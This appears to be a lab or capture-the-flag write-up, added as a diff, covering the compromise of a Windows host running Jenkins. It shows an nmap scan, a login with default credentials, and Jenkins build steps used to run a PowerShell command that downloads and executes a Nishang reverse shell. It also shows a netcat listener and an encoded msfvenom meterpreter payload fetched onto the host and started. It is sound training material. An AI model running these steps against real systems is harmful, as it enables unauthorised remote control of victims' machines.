@@ -1,0 +1,38 @@
+We perform basic nmap scan to see open ports and version of the service that work on it.
+nmap -sV -sC -Pn 10.10.230.14
+
+Only 3 ports open on the machine:
+80 - Microsft IIS httpd 7.5 and its just a webserver
+3389 - Remote RDP
+8080, and it's our Jenkins
+
+Network maper found that's windows system.
+I also started gobuster but no interesting directories found.
+
+
+Ok, let's go then and see our victim port, 10.10.230.14:8080
+On this port I find a page which only contain the image and Email alfred@wayneenterprises.com
+I tried default credentials admin:admin and we are able to acess the backend 
+It was defenitely 2 easy, now we are looking for a feature of the tool that allows you to execute commands on the underlying system, so we can upload our Nishang reverse shell.
+We created the new project in Jenkins Go to new item -> EnterName and select Freestyle project -> Next -> Go into Build section select the Execute window batch command
+Now we can perform almost every command on the system, we know its windows so we can upload our reverse shell via powershell
+I created python HTTP server for this purpose, then pasted powershell command on site:
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+Before we do it we have to create our netcat listening session:
+nc -lvnp <port>
+
+Our session shoud be created, because our powershell command executed our script
+
+To make the privilege escalation easier, let's switch to a meterpreter shell
+I used msfvenom to create the a windows meterpreter reverse shell using the following payload
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o venom.exe
+
+Then I created another python HTTP server to download our venom.exe via powershell commands, pasted it on victim machine:
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+Start venom.exe:
+Start-Process "venom.exe"
+
+Now that we have initial access, let's use token impersonation to gain system access.
+Windows uses tokens to ensure that account have right privs to make some action that requires them. This is done by LSASS.exe
